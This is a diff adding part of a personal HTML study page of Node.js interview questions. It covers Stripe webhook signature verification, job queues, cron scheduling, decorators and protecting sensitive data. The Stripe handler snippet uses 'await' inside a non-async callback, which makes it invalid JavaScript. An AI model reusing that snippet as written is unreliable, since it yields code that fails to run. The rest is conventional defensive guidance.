+      <pre><code>app.post('/webhooks/stripe', express.raw({ type: 'application/json' }), (req, res) => {
+  const sig = req.headers['stripe-signature'];
+  let event;
+  try {
+    event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
+  } catch (err) {
+    return res.status(400).json({ error: 'Webhook signature verification failed' });
+  }
+
+  switch (event.type) {
+    case 'payment_intent.succeeded':
+      const payment = event.data.object;
+      await Order.updateOne({ paymentIntentId: payment.id }, { paymentStatus: 'paid' });
+      break;
+    case 'payment_intent.payment_failed':
+      break;
+  }
+
+  res.json({ received: true });
+});</code></pre>
+      <p><strong>Retries:</strong> webhook providers retry on failure (Stripe retries for 3 days) — make endpoints idempotent.</p>
+      <p>Signature verification (the <code>stripe-signature</code> header check above) is non-negotiable, not optional hardening — without it, a webhook endpoint is just an unauthenticated public URL that will blindly accept forged events (e.g., anyone POSTing a fake "payment succeeded" to mark an order paid). Note the endpoint must receive the <em>raw, unparsed</em> request body (<code>express.raw()</code>, not <code>express.json()</code>) because the signature is computed over the exact byte sequence sent — re-serializing a parsed-then-stringified JSON body would produce a different signature and always fail verification.</p>
+      <p><strong>Interview follow-up:</strong> "why must the handler be idempotent given retries?" — because the provider has no way to know whether your 500 response meant "I received it but failed to process" or "I never received it," so it always retries on non-2xx; if updating the order status twice for the same event isn't safe (e.g., double-incrementing a counter), you need to track processed event IDs and no-op on repeats.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q51.</span> How do you handle long-running requests? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>HTTP has timeouts (~30-60s). Tasks like video encoding or bulk email take minutes.</p>
+      <pre><code>Client → POST /export-report → Server returns 202 Accepted + jobId
+                                    ↓
+                              Adds job to queue (Bull/BullMQ)
+                                    ↓
+                         Worker process picks up job
+                                    ↓
+                         Worker completes task (may take minutes)
+                                    ↓
+                         Stores result / sends email / webhook
+
+Client → GET /jobs/:jobId/status → { status: "processing", progress: 45% }
+Client → GET /jobs/:jobId/status → { status: "completed", downloadUrl: "..." }</code></pre>
+      <pre><code>const Queue = require('bull');
+const emailQueue = new Queue('emails', { redis: { host: 'localhost', port: 6379 } });
+
+app.post('/send-bulk-email', authenticate, async (req, res) => {
+  const job = await emailQueue.add({ recipients: req.body.emails, template: 'welcome' });
+  res.status(202).json({ jobId: job.id, message: 'Processing started' });
+});
+
+emailQueue.process(async (job) => {
+  const { recipients, template } = job.data;
+  for (const [i, email] of recipients.entries()) {
+    await sendEmail(email, template);
+    job.progress(Math.round((i / recipients.length) * 100));
+  }
+});
+
+app.get('/jobs/:id', authenticate, async (req, res) => {
+  const job = await emailQueue.getJob(req.params.id);
+  res.json({ status: await job.getState(), progress: job.progress() });
+});</code></pre>
+      <p><strong>Tools:</strong> Bull/BullMQ (Redis-based), Agenda (MongoDB-based), AWS SQS + Lambda.</p>
+      <p>This pattern trades immediate consistency for responsiveness and resilience: the client gets an instant 202 instead of blocking a connection (and a load balancer/proxy timeout) for minutes, and if a worker crashes mid-job, a durable queue (Redis-backed Bull, SQS) can redeliver the job rather than losing it silently the way an in-process <code>setTimeout</code> or fire-and-forget promise would on a server restart. Workers can also be scaled independently of the API — spin up more worker processes/containers when the queue backs up, without touching the web tier at all.</p>
+      <p><strong>Interview follow-up:</strong> "how does the client find out when it's done, beyond polling?" — alternatives to polling include Server-Sent Events/WebSockets pushing a completion event, or the more common production choice of firing a webhook/email to the client once the job finishes, avoiding the wasted-request problem polling has (see Q50). <strong>Common pitfall:</strong> making job handlers non-idempotent — a worker crash after partially completing a job (e.g., after sending 400 of 1000 emails) means the queue will redeliver it, so handlers must either resume safely or dedupe already-processed work.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q52.</span> What is job scheduling in Node.js? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p><strong>Job scheduling</strong> means running a task at a particular time, after a delay, or repeatedly according to a schedule. Common examples include sending daily reports, clearing expired sessions, generating invoices, creating backups, and retrying failed work.</p>
+      <p>For a simple single-process application, a package such as <code>node-cron</code> can run cron expressions:</p>
+      <pre><code>const cron = require('node-cron');
+
+// Run every day at 9:00 AM in the specified time zone.
+cron.schedule('0 9 * * *', async () =&gt; {
+  await sendDailyReport();
+}, { timezone: 'Asia/Kolkata' });</code></pre>
+      <p><code>setTimeout()</code> and <code>setInterval()</code> are suitable for short-lived, non-critical timers, but their schedules are lost when the process restarts. An in-process cron job also runs once in <em>every</em> application replica, which may duplicate work when the service is horizontally scaled.</p>
+      <p>For production-critical jobs, use a durable queue or external scheduler such as BullMQ with Redis, Agenda with MongoDB, a cloud scheduler, or Kubernetes CronJob. Store job state, configure retries and backoff, make the handler idempotent, monitor failures, and use a distributed lock or a single scheduler/worker when only one execution is allowed.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q53.</span> What are decorators? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>A <strong>decorator</strong> is a function applied to a class or class member to add metadata or modify its definition without placing that cross-cutting behavior directly inside the business logic. Decorators are common in TypeScript frameworks such as NestJS, where they declare controllers, routes, dependency injection, validation, and authorization.</p>
+      <pre><code>import { Controller, Get, UseGuards } from '@nestjs/common';
+
+@Controller('users')                 // Class decorator: route prefix
+export class UserController {
+  @Get(':id')                        // Method decorator: HTTP GET route
+  @UseGuards(AuthGuard)              // Adds authorization behavior
+  findOne() {
+    return { message: 'User found' };
+  }
+}</code></pre>
+      <p>Conceptually, <code>@Controller</code> registers metadata about the class, while the framework reads that metadata during startup and builds the required routing behavior. A decorator does not automatically make code secure or validate input—the framework or supporting runtime must interpret and enforce its metadata.</p>
+      <p><strong>Interview note:</strong> decorator syntax and semantics depend on the JavaScript/TypeScript version and configuration. TypeScript's legacy <code>experimentalDecorators</code> behavior and newer standard JavaScript decorators are not identical, so avoid mixing decorator implementations intended for different systems.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q54.</span> How would you secure sensitive information in a web application? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Protect sensitive information throughout its lifecycle—collection, transmission, storage, processing, logging, and deletion—and collect only what the application actually needs.</p>
+      <ul>
+        <li><strong>Secrets:</strong> keep API keys, database credentials, and signing keys out of source code and client bundles. Load them from environment variables or a secret manager, restrict access by role, rotate them, and scan commits and dependencies for leaks.</li>
+        <li><strong>Passwords:</strong> never store plaintext or reversible encrypted passwords. Store a salted, slow password hash using Argon2id or bcrypt and apply login rate limiting and MFA where appropriate.</li>
+        <li><strong>Data in transit and at rest:</strong> enforce HTTPS/TLS, enable encryption for databases, backups, and object storage, and manage encryption keys separately from the encrypted data.</li>
+        <li><strong>Authentication and sessions:</strong> use short-lived tokens, validate issuer, audience, signature, and expiry, and store browser session/refresh tokens in <code>HttpOnly</code>, <code>Secure</code>, appropriately <code>SameSite</code> cookies. Revoke or rotate refresh tokens after use.</li>
+        <li><strong>Authorization:</strong> check permissions on the server for every protected resource. Use least privilege for users, services, database accounts, and cloud identities; never rely on hiding UI buttons.</li>
+        <li><strong>Application security:</strong> validate input, use parameterized queries, encode output, configure CORS narrowly, add CSRF protection for cookie-authenticated state-changing requests, and set security headers with middleware such as Helmet.</li>
+        <li><strong>Logs and errors:</strong> redact passwords, tokens, personal data, and payment details. Return generic errors to clients while keeping access-controlled diagnostic details in server logs.</li>
+      </ul>
+      <pre><code>require('dotenv').config();
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+
+app.disable('x-powered-by');
+app.use(helmet());
+app.use('/auth', rateLimit({ windowMs: 15 * 60 * 1000, max: 20 }));
+
+// Read server-only configuration; never send this value to the browser.
+const databaseUrl = process.env.DATABASE_URL;
+if (!databaseUrl) throw new Error('DATABASE_URL is not configured');</code></pre>
+      <p>Finally, keep dependencies patched, run security tests and audits, back up encrypted data, test recovery, and maintain an incident-response plan. Security is layered: no single control is sufficient on its own.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">Quick Reference Summary</h2>
+  <p>The table below is a rapid-fire recall aid for the night before an interview — if any row doesn't immediately trigger the full explanation and a code example in your head, jump back to that numbered question above and re-read it.</p>
+  <table>
+    <tr><th>Topic</th><th>Key Takeaway</th></tr>
+    <tr><td>Node concurrency</td><td>Single thread + non-blocking I/O + event loop</td></tr>
+    <tr><td>Event loop</td><td>6 phases: timers → pending → idle → poll → check → close</td></tr>
+    <tr><td>Microtasks</td><td>process.nextTick &gt; Promise.then &gt; macrotasks</td></tr>
+    <tr><td>Libuv pool</td><td>Used by fs, crypto, dns.lookup — default 4 threads</td></tr>
+    <tr><td>Blocking ops</td><td>Dangerous — freeze all requests; always use async APIs</td></tr>
+    <tr><td>Clusters</td><td>One process per CPU core; share same port</td></tr>
+    <tr><td>Streams</td><td>Process data in chunks; avoid memory overload</td></tr>
+    <tr><td>Middleware</td><td>Functions in a chain; must call next()</td></tr>
+    <tr><td>MVC</td><td>Routes → Controllers → Services → Models</td></tr>
+    <tr><td>Error handling</td><td>Centralized middleware + next(err) + asyncHandler</td></tr>
+    <tr><td>REST</td><td>Stateless, uniform interface, resource-based URLs</td></tr>
+    <tr><td>PUT vs PATCH</td><td>PUT = replace all; PATCH = update partial</td></tr>
+    <tr><td>JWT flow</td><td>accessToken (short) + refreshToken (long) + rotation</td></tr>
+    <tr><td>Bcrypt</td><td>Slow by design; salt + work factor</td></tr>
+    <tr><td>Tokens storage</td><td>httpOnly cookie (safe from XSS); CSRF protection needed</td></tr>
+    <tr><td>CORS</td><td>Browser restriction; fix with cors() middleware</td></tr>
+    <tr><td>CSRF</td><td>Cookie auto-send exploit; prevent with SameSite + CSRF token</td></tr>
+    <tr><td>Multer</td><td>Parse multipart/form-data file uploads</td></tr>
+    <tr><td>Pre-signed URL</td><td>Temporary S3 URL; client uploads directly; saves server bandwidth</td></tr>
+    <tr><td>Connection pool</td><td>Reuse DB connections; avoid per-request connection overhead</td></tr>
+    <tr><td>Embedding vs ref</td><td>Embed: co-located, few items; Reference: shared, large</td></tr>
+    <tr><td>Transactions</td><td>Needed when multiple writes must be atomic</td></tr>
+    <tr><td>Indexing</td><td>Speeds up reads; slows writes; index query fields</td></tr>
+    <tr><td>Webhooks</td><td>Server pushes events; always verify signature; make idempotent</td></tr>
+    <tr><td>Long-running tasks</td><td>Return 202 immediately; use job queues (Bull + Redis)</td></tr>
+    <tr><td>Job scheduling</td><td>Cron for schedules; durable queues/external schedulers for critical distributed work</td></tr>
+    <tr><td>Decorators</td><td>Attach metadata or behavior to classes and members; common in TypeScript/NestJS</td></tr>
+    <tr><td>Sensitive information</td><td>Secret manager + TLS/encryption + password hashing + least privilege + safe logs</td></tr>
+  </table>
+
+</main>
+
+<footer class="site">Personal revision notes &middot; static HTML, no build step.</footer>
+
+</body>
+</html>
